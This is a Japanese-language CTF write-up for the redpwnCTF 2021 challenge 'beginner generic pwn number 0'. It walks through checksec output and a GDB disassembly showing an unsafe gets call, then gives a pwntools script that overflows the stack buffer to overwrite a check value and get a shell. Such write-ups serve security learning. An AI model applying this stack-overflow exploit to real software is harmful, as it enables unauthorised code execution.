# beginner generic pwn number 0 - redpwnCTF 2021

![Buffer Overflow](https://img.shields.io/badge/Type-Buffer%20Overflow-red)

### writeup
- checksec
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
- debug

GDBで、main関数の中を覗くと

```
0x00000000004012a0 <+170>:   call   0x4010f0 <gets@plt>
0x00000000004012a5 <+175>:   cmp    QWORD PTR [rbp-0x8],0xffffffffffffffff
```

`gets`を使っているので、自明なBofです。
また、次の処理で`0xffffffffffffffff`(-1)と比較しています。

よって、Bufferを埋めた後、-1の値を送るexploitを書けばいいということになります。

### solver
```python=
from pwn import *

io = process("./beginner-generic-pwn-number-0")
#io = remote('mc.ax', 31077)

payload = b""
payload += b"A"*32 + b"B"*8
payload += b"\xff"*8

io.sendlineafter(":(", payload)
io.interactive()
```
